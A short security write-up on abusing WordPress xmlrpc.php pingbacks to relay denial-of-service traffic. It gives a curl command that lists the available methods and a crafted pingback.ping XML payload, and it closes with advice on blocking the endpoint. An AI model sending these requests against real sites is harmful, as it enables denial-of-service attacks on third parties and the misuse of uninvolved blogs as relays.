# Denial of Service

### Purpose / Concept
- The xmlrpc.php endpoint can be abused to perform a denial-of-service attack. A small request to this endpoint can cause WordPress to respond by sending a full page of content to a target of the attacker’s choosing. By coordinating multiple WordPress sites, the combined traffic can overwhelm the target host, potentially knocking it offline due to network congestion.

### Enumerating available methods
- Before exploiting pingback, the attacker enumerates the methods supported by xmlrpc.php using:

```
curl -X POST -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://examplewp.com/xmlrpc.php
```

- The server responds with an XML list of methods, for example:

```
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>pingback.extensions.getPingbacks</string></value>
  <value><string>pingback.ping</string></value>
  <value><string>mt.publishPost</string></value>
**** truncated ****
```

- The presence of pingback.ping indicates that pingbacks are enabled.

### Crafting the pingback request
If pingback is enabled, a request can be sent specifying:

- Target URL → the site the attacker wants to DDoS

- Source URL → the WordPress blog sending the pingback

```
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://**denial-of-service-target**:**portno**</string></value>
</param><param><value><string>http://**blog-url-from-wp**</string>
</value></param></params>
</methodCall>
```

### Effect of the attack
- Multiple WordPress sites sending pingbacks to the same target can generate enough traffic to cause network congestion and downtime. Your WordPress site acts as an unwitting relay, not the actual target.

# Defense / mitigation

- Disable access to xmlrpc.php if the API is not needed.

- Use .htaccess or web server configuration to block the endpoint.

- This prevents pingback abuse and reduces bot traffic/noise in your logs.

# Referances
- https://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html
- https://hackerone.com/reports/752073
